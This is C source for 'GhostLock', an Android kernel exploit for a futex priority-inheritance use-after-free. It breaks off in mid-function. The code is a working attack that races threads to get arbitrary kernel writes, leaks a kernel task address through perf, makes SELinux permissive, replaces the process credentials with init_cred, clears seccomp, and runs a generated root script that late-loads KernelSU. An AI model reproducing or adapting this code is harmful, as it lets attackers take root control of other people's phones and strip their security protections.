/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 */

#include "common.h"
#include "offsets.h"
#include <ctype.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <sys/system_properties.h>
#include <sys/utsname.h>
#include <strings.h>

const struct kernel_offsets *active_offsets = NULL;

static char g_home_dir[256] = "/data/local/tmp";
static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";

/* MTK and XRing use different physical mappings from the Qualcomm default.
 * W1 has no root and /proc is SELinux-blocked: read SoC properties from the
 * shared property area instead. */
enum soc_family {
  SOC_QCOM = 0,
  SOC_MTK,
  SOC_XRING,
};

static enum soc_family detect_soc(void) {
  char buf[256];
  const char *keys[] = {"ro.soc.manufacturer", "ro.soc.model",
                        "ro.board.platform", NULL};
  for (int i = 0; keys[i]; i++) {
    if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
      continue;
    }
    if (strncasecmp(buf, "mediatek", 8) == 0 ||
        strncasecmp(buf, "mtk", 3) == 0 ||
        (i > 0 && strncasecmp(buf, "mt", 2) == 0)) {
      return SOC_MTK;
    }
  }
  for (int i = 0; keys[i]; i++) {
    if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
      continue;
    }
    if (strncasecmp(buf, "xring", 5) == 0 ||
        (i > 0 && strncasecmp(buf, "o1", 2) == 0)) {
      return SOC_XRING;
    }
  }
  return SOC_QCOM;
}

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef ROOT_TASK_GROUP_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"
/* VR.ko anti-root fallback defines */
#ifndef VR_TAG_A_OFF
#define VR_TAG_A_OFF           0x06
#endif
#ifndef VR_TAG_B_OFF
#define VR_TAG_B_OFF           0x2c
#endif
#ifndef VR_SYSCALL_TP_FLAG
#define VR_SYSCALL_TP_FLAG     0x400ULL
#endif
#ifndef TASK_THREAD_INFO_FLAGS_OFF
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#endif
#include "offsets_json.h"

static struct kernel_offsets g_external_offsets;
static char g_external_release[192];

/* Publish the active entry's init_cred image address and the physical load
 * address (MTK always loads at the DRAM base, text_offset=0). */
static void publish_active_offsets(void) {
  g_init_cred_image = INIT_CRED;
  if (active_offsets->kernel_phys_load) {
    p0_kernel_phys_load = active_offsets->kernel_phys_load;
  }
  enum soc_family soc = detect_soc();
  const char *soc_name = "qcom/other";
  if (soc == SOC_MTK) {
    p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
    soc_name = "mtk";
  } else if (soc == SOC_XRING) {
    p0_kernel_phys_load = XRING_KERNEL_PHYS_LOAD;
    soc_name = "xring";
  }
  pr_info("soc: %s; kernel_phys_load=0x%llx\n",
          soc_name, (unsigned long long)p0_kernel_phys_load);
  pr_info("init_cred image=%016zx alias=%016zx\n",
          (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
}

/* Import a matching entry from <home>/offsets.json; returns 0 and activates
 * the external table on success.  When the release is also registered in the
 * built-in table, the entry starts from the built-in values so fields the
 * JSON leaves empty keep the built-in ones instead of falling back to
 * target.h defaults. */
static int try_external_offsets(const char *release) {
  char path[320];
  snprintf(path, sizeof(path), "%s/offsets.json", g_home_dir);
  const struct kernel_offsets *builtin = NULL;
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(release, known_offsets[i].uname_r) == 0) {
      builtin = &known_offsets[i];
      break;
    }
  }
  if (builtin) {
    g_external_offsets = *builtin;
  } else {
    memset(&g_external_offsets, 0, sizeof(g_external_offsets));
  }
  int rc = load_offsets_json(path, release, &g_external_offsets,
                             g_external_release, sizeof(g_external_release));
  if (rc == 0) {
    active_offsets = &g_external_offsets;
    pr_success("offsets imported from offsets.json: %s\n",
               active_offsets->uname_r);
  } else {
    pr_info("no external offsets match at %s\n", path);
  }
  return rc;
}
static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
  if (strcmp(uts.release, TARGET_KERNEL_RELEASE) != 0) {
    pr_error("build requires kernel %s, got %s\n",
             TARGET_KERNEL_RELEASE, uts.release);
    return -1;
  }
#endif
  /* Imported offsets win over the built-in tables so refreshed values take
   * effect without rebuilding the app. */
  if (try_external_offsets(uts.release) == 0) {
    publish_active_offsets();
    return 0;
  }
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      publish_active_offsets();
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild, or import a matching "
           "offsets.json entry into %s\n",
           g_home_dir);
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int owner_stop;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_inflight;
atomic_int main_route_delay_usec;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  if (tcp_route_selected()) {
    do_tcp_fake_lock_route();
  } else {
    do_pselect_fake_lock_route();
  }
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  while (!atomic_load(&owner_stop)) sleep(1);
  if (lock_target == 0)
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        atomic_store(&consumer_inflight, 1);
        errno = 0;
        /* rotate the nice every call; (calls%19)+1 is what makes
         * sched_setattr succeed on 6.1 compact */
        int consumer_nice = (active_offsets && active_offsets->compact_waiter)
                                ? (calls_this_seq % 19) + 1
                                : PSELECT_CONSUMER_NICE;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        atomic_store(&consumer_inflight, 0);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&owner_stop, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  route_last_step = 0; route_last_errno = 0;
}

int run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  while (!atomic_load(&route_done)) usleep(5000);

  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);

  return atomic_load(&consumer_calls) > 0 &&
         atomic_load(&consumer_success) > 0 && route_last_step == 0;
}

static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
  /* Both transports write *(target) := value through the erase left-only
   * relink: waiter words are {pc = value, right = 0, left = target} and
   * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
  pselect_child_node = leaf ? 0 : 1;
  set_pselect_write_mode(target, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page();
  if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  int routed = run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  if (!routed) {
    pr_warning("  PI route did not produce a verified write\n");
  }
  return routed;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) {
    /* untrusted_app often cannot read enforce while SELinux is enforcing. */
    return 0;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int enforce_readable(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) return 0;
  close(efd);
  return 1;
}

static int process_has_seccomp(void) {
  /* The app flow runs inside zygote, whose seccomp filter blocks
   * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
   * fork() inherits that, so the W2 child does not need W3 there. */
  FILE *status = fopen("/proc/self/status", "r");
  if (!status) return 0;
  char line[256];
  int seccomp = 0;
  while (fgets(line, sizeof(line), status)) {
    if (strncmp(line, "Seccomp:", 8) == 0) {
      seccomp = atoi(line + 8);
      break;
    }
  }
  fclose(status);
  return seccomp != 0;
}

static void slab_drain(void) {
  /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
   * (exit 137) especially right before heap spray. */
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 2 : 1;
  int batch = (up.tv_sec > 60) ? 64 : 32;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
    if (!drain) return;
    int n = 0;
    for (int i = 0; i < batch; i++) {
      pid_t pid = fork();
      if (pid == 0) {
        pause();
        _exit(0);
      }
      if (pid > 0) drain[n++] = pid;
      else break;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
    usleep(20000);
  }
}

int g_core_main = 0;
int g_core_consumer = 1;

void init_cpu_config(void) {
  g_core_main = 0;
  g_core_consumer = 1;

  const char *s = getenv("GHOSTLOCK_CORE");
  if (s && *s) {
    long v = strtol(s, NULL, 10);
    if (v >= 0 && v < CPU_SETSIZE) {
      g_core_main = (int)v;
    } else {
      pr_warning("invalid GHOSTLOCK_CORE=%s, using %d\n", s, g_core_main);
    }
  }
  s = getenv("GHOSTLOCK_CONSUMER_CORE");
  if (s && *s) {
    long v = strtol(s, NULL, 10);
    if (v >= 0 && v < CPU_SETSIZE) {
      g_core_consumer = (int)v;
    } else {
      pr_warning("invalid GHOSTLOCK_CONSUMER_CORE=%s, using %d\n", s,
                 g_core_consumer);
    }
  } else {
    g_core_consumer = g_core_main + 1;
  }

  if (g_core_main == g_core_consumer) {
    pr_warning("main and consumer cores are the same (%d); falling back\n",
               g_core_main);
    g_core_main = 0;
    g_core_consumer = 1;
  }

  cpu_set_t allowed;
  if (sched_getaffinity(0, sizeof(allowed), &allowed) == 0 &&
      (!CPU_ISSET(g_core_main, &allowed) ||
       !CPU_ISSET(g_core_consumer, &allowed))) {
    pr_warning("cores %d/%d not in allowed cpuset; falling back to 0/1\n",
               g_core_main, g_core_consumer);
    g_core_main = 0;
    g_core_consumer = 1;
  }

  pr_info("cpu pair: main=%d consumer=%d\n", g_core_main, g_core_consumer);
}

static void init_runtime_paths(void) {
  const char *home = getenv("GHOSTLOCK_HOME");
  if (!home || !home[0]) home = getenv("TMPDIR");
  if (!home || !home[0]) home = "/data/local/tmp";

  snprintf(g_home_dir, sizeof(g_home_dir), "%s", home);
  size_t n = strlen(g_home_dir);
  while (n > 1 && g_home_dir[n - 1] == '/') {
    g_home_dir[--n] = '\0';
  }
  snprintf(g_root_script_path, sizeof(g_root_script_path),
           "%s/.ghostlock_root.sh", g_home_dir);
  pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
}

static void write_root_script(void) {
  char script[4096];
  int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_warning("open root script failed path=%s errno=%d\n",
               g_root_script_path, errno);
    return;
  }

  int n = snprintf(
      script, sizeof(script),
      "#!/system/bin/sh\n"
      "HOME_DIR='%s'\n"
      "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
      "KSUD=\"$HOME_DIR/ksud\"\n"
      "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
      "chmod 644 \"$LOG\" 2>/dev/null\n"
      "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
      "fi\n"
      "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
      "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
      "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
      "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
      "if [ \"$(id -u)\" -ne 0 ]; then\n"
      "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "KVER=$(uname -r | cut -d. -f1-2)\n"
      "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
      "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
      "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "KMI=\"${AVER}-${KVER}\"\n"
      "# step 1: restore policy (W1 already made permissive)\n"
      "FIXUP_RC=1\n"
      "for i in $(seq 1 10); do\n"
      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
      "  load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1 &\n"
      "  LPID=$!\n"
      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
      "  SPID=$!\n"
      "  wait $LPID 2>/dev/null\n"
      "  FIXUP_RC=$?\n"
      "  kill $SPID 2>/dev/null\n"
      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "    break\n"
      "  fi\n"
      "  sleep 2\n"
      "done\n"
      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
      "  KSU_ALREADY=1\n"
      "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
      "else\n"
      "  KSU_ALREADY=0\n"
      "  if [ ! -x \"$KSUD\" ]; then\n"
      "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
      "    exit 1\n"
      "  fi\n"
      "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
      "  chmod 755 \"$KSUD\" 2>/dev/null\n"
      "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
      "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
      "fi\n"
      "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
      "KSU_READY=0\n"
      "for i in $(seq 1 50); do\n"
      "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
      "  sleep 0.1\n"
      "done\n"
      "if [ \"$KSU_READY\" -ne 1 ]; then\n"
      "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
      "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
      "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
      "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "fi\n"
      "else\n"
      "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
      "fi\n",
      g_home_dir);
  if (n < 0 || n >= (int)sizeof(script)) {
    pr_warning("root script too long\n");
    close(sfd);
    return;
  }
  if (write(sfd, script, (size_t)n) != n) {
    pr_warning("write root script failed errno=%d\n", errno);
  }
  close(sfd);
  chmod(g_root_script_path, 0755);
}

static int kernelsu_module_loaded(void) {
  FILE *modules = fopen("/proc/modules", "r");
  if (!modules) return 0;

  char line[256];
  int loaded = 0;
  while (fgets(line, sizeof(line), modules)) {
    char name[64];
    if (sscanf(line, "%63s", name) == 1 && strcmp(name, "kernelsu") == 0) {
      loaded = 1;
      break;
    }
  }
  fclose(modules);
  return loaded;
}

/* Find a task through perf sample records. */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  setpgid(0, 0);  /* own group; the parent kills the whole tree on timeout */
  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
                                          * root shell / ksud chain */
  prctl(PR_SET_NAME, "ghostleaf_0123456789");
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'F') {
      /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
       * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
       * filter); mode==0 lets it run filter-free to a normal errno. Forked
       * so SIGSYS costs only this. */
      uint32_t code = 0xffffffff;
      int probe_pipe[2];
      if (pipe(probe_pipe) == 0) {
        pid_t probe = fork();
        if (probe == 0) {
          close(probe_pipe[0]);
          /* Forked probe: keep default SIGSYS so the filter kills it. */
          signal(SIGSYS, SIG_DFL);
          errno = 0;
          long r = syscall(__NR_finit_module, 0, 0, 0);
          uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
          ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
          (void)nw;
          _exit(0);
        }
        close(probe_pipe[1]);
        int st = 0;
        if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
          ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
          if (nr != (ssize_t)sizeof(code)) code = 0xfffffffe;
        } else {
          code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
        }
        close(probe_pipe[0]);
      }
      write(p->uid_w, &code, sizeof(code));
    }
    else if (cmd == 'M') {
      /* Report comm length + first byte to tell which side a leaf=1 write
       * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
       * [target+8] len 8, untouched len 15. */
      char comm[24] = {0};
      FILE *cf = fopen("/proc/self/comm", "r");
      if (cf) {
        size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
        (void)n;
        fclose(cf);
      }
      size_t len = strlen(comm);
      while (len > 0 && comm[len - 1] == '\n') {
        comm[len - 1] = 0;
        len--;
      }
      uint32_t report =
        ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
      write(p->uid_w, &report, sizeof(report));
    }
    else if (cmd == 'G' || cmd == 'X') break;
  }
  close(p->cmd_r);
  if (getuid() != 0) { close(p->uid_w); _exit(1); }
  /* Don't leak app-side fds into the root shell chain: ksud/zygisk
   * daemons must not keep their write ends open. */
  for (int fd = 3; fd < 1024; fd++) {
    int fl = fcntl(fd, F_GETFD);
    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
  }
  pid_t worker = fork();
  if (worker == 0) {
    /* Detach into a brand-new session: the independent root shell owns the
     * whole chain (ksud late-load + module watch) and must survive the
     * exploit parent killing this group on timeout. */
    if (setsid() < 0) _exit(1);
    execl("/system/bin/sh", "sh", g_root_script_path, NULL);
    _exit(1);
  }
  if (worker < 0) { close(p->uid_w); _exit(1); }
  /* Do not wait: the root shell runs to completion on its own; the parent
   * polls the app-readable log. */
  close(p->uid_w);
  _exit(0);
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

typedef int (*write_stage_verify_fn)(void *context);

static int retry_write_stage(
    const char *stage, uintptr_t target, int mode, int attempts,
    useconds_t settle_usec, write_stage_verify_fn verify, void *context,
    int leaf) {
  for (int attempt = 1; attempt <= attempts; attempt++) {
    pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
    if (attempt == 1) slab_drain();
    int routed = do_one_write(target, stage, mode, leaf);
    if (!routed) {
      pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
      usleep(100000);
      continue;
    }
    if (settle_usec) usleep(settle_usec);
    if (verify(context)) return 1;
    usleep(50000);
  }
  return 0;
}

static int verify_selinux_stage(void *context) {
  (void)context;
  if (!check_selinux_off()) return 0;
  pr_success("SELinux permissive\n");
  return 1;
}

struct w2_stage_context {
  struct child_pipes *pipes;
};

struct w3_stage_context {
  struct child_pipes *pipes;
  int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
};

static int verify_w2_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;

  uint32_t child_uid = 9999;
  if (read(stage->pipes->uid_r, &child_uid, sizeof(child_uid)) !=
      (ssize_t)sizeof(child_uid)) {
    return 0;
  }
  pr_info("child uid = %u\n", child_uid);
  if (child_uid != 0) return 0;
  pr_success("child is root!\n");
  return 1;
}

static int verify_seccomp_probe_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;

  uint32_t code = 0;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
